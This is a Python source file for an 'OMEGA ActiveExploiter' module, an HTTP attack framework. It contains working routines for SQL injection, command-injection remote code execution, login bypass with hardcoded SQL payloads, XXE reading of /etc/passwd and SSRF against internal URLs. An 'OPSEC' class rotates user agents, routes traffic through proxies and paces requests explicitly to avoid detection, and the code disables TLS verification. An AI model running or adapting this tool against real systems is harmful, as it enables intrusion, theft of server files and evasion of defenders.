"""
OMEGA ActiveExploiter Module
Complete implementation for exploit execution and HTTP-based attacks
Extracted from .build file (lines 2862-2894)
"""

import random
import time
import platform
import requests
from typing import Optional, Dict, Any, List
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class OPSECManager:
    """
    Operational security manager for avoiding detection.
    Handles user agent rotation, proxy management, and evasion.
    """
    
    DEFAULT_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.0.0",
    ]
    
    def __init__(self):
        """Initialize OPSEC manager."""
        self.proxy: Optional[Dict[str, str]] = None
        self.user_agents: List[str] = self.DEFAULT_USER_AGENTS.copy()
        self.rotate_ua: bool = True
        self.request_delay: float = 0.0
        self.timeout: int = 10
    
    def load_user_agents(self, ua_list: List[str]) -> None:
        """Load custom user agent list."""
        if ua_list:
            self.user_agents = ua_list
    
    def get_random_ua(self) -> str:
        """Get random user agent string."""
        return random.choice(self.user_agents)
    
    def set_proxy(self, proxy_string: str) -> None:
        """
        Set HTTP/HTTPS proxy.
        
        Args:
            proxy_string: Proxy URL (e.g., "http://127.0.0.1:8080")
        """
        if proxy_string:
            self.proxy = {
                "http": proxy_string,
                "https": proxy_string
            }
        else:
            self.proxy = None
    
    def set_request_delay(self, delay: float) -> None:
        """Set delay between requests (in seconds)."""
        self.request_delay = delay
    
    def set_timeout(self, timeout: int) -> None:
        """Set request timeout (in seconds)."""
        self.timeout = timeout


class ActiveExploiter:
    """
    Active exploitation framework for HTTP-based attacks.
    Handles payload delivery, exploitation, and post-exploit actions.
    """
    
    def __init__(self, opsec_manager: Optional[OPSECManager] = None, 
                 target_url: str = "http://localhost", timeout: int = 10):
        """
        Initialize exploiter.
        
        Args:
            opsec_manager: OPSEC manager instance
            target_url: Base target URL
            timeout: Request timeout in seconds
        """
        self.opsec = opsec_manager or OPSECManager()
        self.target_url = target_url
        self.timeout = timeout
        self.session = self._create_session()
        self.last_response = None
        self.exploit_history: List[Dict[str, Any]] = []
    
    def _create_session(self) -> requests.Session:
        """Create requests session with retries and OPSEC settings."""
        session = requests.Session()
        session.verify = False  # Ignore SSL warnings for testing
        
        # Add retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session
    
    def send_request(self, method: str = "GET", url: Optional[str] = None,
                    **kwargs) -> Optional[requests.Response]:
        """
        Send HTTP request with OPSEC considerations.
        
        Args:
            method: HTTP method (GET, POST, etc.)
            url: Target URL (uses self.target_url if not specified)
            **kwargs: Additional requests parameters
            
        Returns:
            Response object or None on failure
        """
        url = url or self.target_url
        
        # Apply OPSEC settings
        headers = kwargs.get("headers", {}).copy()
        
        if self.opsec.rotate_ua and 'User-Agent' not in headers:
            headers['User-Agent'] = self.opsec.get_random_ua()
        
        kwargs['headers'] = headers
        kwargs['timeout'] = kwargs.get('timeout', self.opsec.timeout)
        
        if self.opsec.proxy:
            kwargs['proxies'] = self.opsec.proxy
        
        try:
            start_time = time.perf_counter()
            response = self.session.request(method=method, url=url, **kwargs)
            end_time = time.perf_counter()
            
            # Add timing metadata
            response.elapsed_time_ms = (end_time - start_time) * 1000
            
            self.last_response = response
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Request failed: {e}")
            return None
        finally:
            if self.opsec.request_delay > 0:
                time.sleep(self.opsec.request_delay)
    
    def test_connectivity(self) -> bool:
        """Test connectivity to target."""
        try:
            response = self.send_request("GET", self.target_url)
            return response is not None and response.status_code < 500
        except Exception:
            return False
    
    def exploit_sql_injection(self, param: str, payload: str, 
                             test_string: str = "1'") -> bool:
        """
        Test and exploit SQL injection vulnerability.
        
        Args:
            param: Parameter name to test
            payload: SQL injection payload
            test_string: Test string to identify vulnerability
            
        Returns:
            True if vulnerable, False otherwise
        """
        try:
            # Test basic vulnerability
            test_params = {param: test_string}
            response = self.send_request("GET", params=test_params)
            
            if response and "syntax error" in response.text.lower():
                print(f"[+] SQL Injection vulnerable parameter: {param}")
                
                # Exploit with payload
                exploit_params = {param: payload}
                exploit_response = self.send_request("GET", params=exploit_params)
                
                if exploit_response:
                    self.exploit_history.append({
                        "type": "SQLInjection",
                        "param": param,
                        "status": "success",
                        "timestamp": time.time()
                    })
                    return True
            
            return False
            
        except Exception as e:
            print(f"[ERROR] SQL injection test failed: {e}")
            return False
    
    def exploit_rce(self, endpoint: str, command: str, 
                   injection_point: str = "cmd") -> Optional[str]:
        """
        Attempt remote code execution.
        
        Args:
            endpoint: Target endpoint
            command: Command to execute
            injection_point: Parameter name for command injection
            
        Returns:
            Command output or None
        """
        try:
            url = f"{self.target_url}{endpoint}"
            payload = {injection_point: command}
            
            response = self.send_request("POST", url, data=payload)
            
            if response and response.status_code == 200:
                self.exploit_history.append({
                    "type": "RCE",
                    "command": command,
                    "status": "success",
                    "timestamp": time.time()
                })
                return response.text
            
            return None
            
        except Exception as e:
            print(f"[ERROR] RCE attempt failed: {e}")
            return None
    
    def exploit_authentication_bypass(self, login_endpoint: str,
                                      username: str = "", 
                                      payloads: Optional[List[str]] = None) -> bool:
        """
        Attempt authentication bypass using common payloads.
        
        Args:
            login_endpoint: Login URL endpoint
            username: Username to test
            payloads: List of bypass payloads (uses defaults if None)
            
        Returns:
            True if bypass successful
        """
        if not payloads:
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "admin' --",
            ]
        
        url = f"{self.target_url}{login_endpoint}"
        
        for payload in payloads:
            try:
                data = {
                    "username": username or payload,
                    "password": payload
                }
                
                response = self.send_request("POST", url, data=data)
                
                if response and response.status_code == 200 and "success" in response.text.lower():
                    print(f"[+] Authentication bypass successful with payload: {payload}")
                    self.exploit_history.append({
                        "type": "AuthBypass",
                        "payload": payload,
                        "status": "success",
                        "timestamp": time.time()
                    })
                    return True
                    
            except Exception:
                continue
        
        return False
    
    def exploit_xxe(self, endpoint: str, injection_point: str = "xml",
                   file_to_read: str = "/etc/passwd") -> Optional[str]:
        """
        Attempt XXE (XML External Entity) injection.
        
        Args:
            endpoint: Target endpoint
            injection_point: Parameter name
            file_to_read: File to attempt reading
            
        Returns:
            File contents or None
        """
        try:
            xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_to_read}">]>
<foo>&xxe;</foo>"""
            
            url = f"{self.target_url}{endpoint}"
            headers = {"Content-Type": "application/xml"}
            
            response = self.send_request("POST", url, data=xxe_payload, 
                                        headers=headers)
            
            if response and file_to_read in response.text:
                print(f"[+] XXE successful - File read: {file_to_read}")
                self.exploit_history.append({
                    "type": "XXE",
                    "file": file_to_read,
                    "status": "success",
                    "timestamp": time.time()
                })
                return response.text
            
            return None
            
        except Exception as e:
            print(f"[ERROR] XXE exploit failed: {e}")
            return None
    
    def exploit_ssrf(self, endpoint: str, internal_url: str) -> Optional[str]:
        """
        Attempt Server-Side Request Forgery (SSRF).
        
        Args:
            endpoint: Target endpoint
            internal_url: Internal URL to request
            
        Returns:
            Response from internal URL or None
        """
        try:
            url = f"{self.target_url}{endpoint}"
            payload = {
                "url": internal_url,
                "target": internal_url,
                "redirect": internal_url
            }
            
            response = self.send_request("POST", url, data=payload)
            
            if response and response.status_code == 200:
                self.exploit_history.append({
                    "type": "SSRF",
                    "internal_url": internal_url,
                    "status": "success",
                    "timestamp": time.time()
                })
                return response.text
            
            return None
            
        except Exception as e:
            print(f"[ERROR] SSRF exploit failed: {e}")
            return None
    
    def get_exploit_history(self) -> List[Dict[str, Any]]:
        """Get history of all exploitation attempts."""
        return self.exploit_history.copy()
    
    def clear_history(self) -> None:
        """Clear exploitation history."""
        self.exploit_history.clear()
    
    def close(self) -> None:
        """Close session."""
        if self.session:
            self.session.close()
    
    def __del__(self):
        """Cleanup on object destruction."""
        self.close()
